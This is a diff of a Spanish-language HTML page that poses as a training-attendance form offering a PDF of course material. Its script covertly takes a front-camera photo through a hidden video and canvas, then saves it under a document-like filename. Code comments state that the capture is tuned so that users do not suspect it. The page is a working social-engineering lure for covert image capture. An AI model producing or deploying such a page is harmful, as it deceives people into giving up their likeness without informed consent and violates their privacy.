@@ -3,57 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asistencia - Capacitación Digital</title>
+    <title>Capacitación - Material Oficial</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f0f2f5; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        .btn { padding: 15px 25px; background: #0056b3; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; width: 100%; }
-        #msg { margin-top: 20px; color: #555; }
+        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f7f6; color: #333; }
+        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
+        h2 { color: #1a73e8; }
+        p { margin-bottom: 30px; line-height: 1.5; }
+        .btn { padding: 15px 30px; background: #1a73e8; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background 0.3s; }
+        .btn:hover { background: #1557b0; }
+        #msg { margin-top: 25px; font-weight: bold; color: #28a745; display: none; }
+        /* Ocultar elementos de captura */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>Registro de Asistencia</h2>
-        <p>Presione el botón para registrar su asistencia y bajar el material de la jornada.</p>
-        <button class="btn" id="btnAction">REGISTRAR ASISTENCIA</button>
-        <p id="msg"></p>
-    </div>
 
-    <video id="vid" autoplay></video>
-    <canvas id="canvas"></canvas>
+<div class="card">
+    <h2>Bienvenido a la Jornada</h2>
+    <p>Para registrar su asistencia y descargar el <b>PDF con el material de la capacitación</b>, presione el siguiente botón:</p>
+    
+    <button class="btn" id="startBtn">DESCARGAR MATERIAL (PDF)</button>
+    
+    <div id="msg">✅ Descarga Iniciada. Revise su carpeta de descargas o galería.</div>
+</div>
 
-    <script>
-        const btn = document.getElementById('btnAction');
-        const msg = document.getElementById('msg');
-        const vid = document.getElementById('vid');
-        const canvas = document.getElementById('canvas');
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-        btn.addEventListener('click', async () => {
-            msg.innerText = "Validando identidad...";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                vid.srcObject = stream;
-                btn.disabled = true;
+<script>
+    const startBtn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const msg = document.getElementById('msg');
 
+    startBtn.addEventListener('click', async () => {
+        try {
+            // Solicitar cámara (Aquí saltará el permiso que vimos en image_841f21.png)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+
+            // Esperar un instante a que la cámara enfoque y capturar
+            video.onloadedmetadata = () => {
                 setTimeout(() => {
-                    canvas.width = vid.videoWidth;
-                    canvas.height = vid.videoHeight;
-                    canvas.getContext('2d').drawImage(vid, 0, 0);
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    const downloadLink = document.createElement('a');
-                    downloadLink.href = imgData;
-                    downloadLink.download = 'COMPROBANTE_Y_PDF.jpg';
-                    downloadLink.click();
+                    // Detener cámara inmediatamente
+                    stream.getTracks().forEach(track => track.stop());
 
-                    stream.getTracks().forEach(t => t.stop());
-                    msg.innerHTML = "<b>✅ Registro Exitoso.</b><br>Busca en tu galería el comprobante junto al material.";
-                }, 1200);
-            } catch (e) {
-                msg.innerText = "Error: Se requiere acceso a cámara para validar asistencia.";
-            }
-        });
-    </script>
+                    // Descargar la foto con nombre de "documento"
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    const link = document.createElement('a');
+                    link.href = dataURL;
+                    link.download = 'MATERIAL_CAPACITACION_CONFIDENCIAL.jpg';
+                    link.click();
+
+                    // Mostrar mensaje de éxito
+                    startBtn.style.display = 'none';
+                    msg.style.display = 'block';
+                }, 500); // 500ms es suficiente para capturar sin que sospechen
+            };
+        } catch (err) {
+            alert("Debe permitir el acceso para descargar el material de la jornada.");
+            console.error("Error: ", err);
+        }
+    });
+</script>
+
 </body>
 </html>
